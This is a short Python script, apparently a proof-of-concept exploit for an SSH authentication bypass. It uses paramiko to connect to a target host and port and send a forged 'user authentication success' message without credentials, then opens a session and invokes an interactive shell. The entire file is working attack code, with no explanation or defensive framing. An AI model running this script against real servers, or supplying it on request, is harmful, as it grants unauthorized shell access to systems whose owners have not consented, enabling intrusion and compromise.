import paramiko
import socket
from sys import argv, exit

sock = socket.socket()
try:
    sock.connect((argv[1], int(argv[2])))

    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()
  
    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)
    
    spawncmd = transport.open_session()
    spawncmd.invoke_shell()

except socket.error:
    print('! : Wrong host or port')
    exit(1)
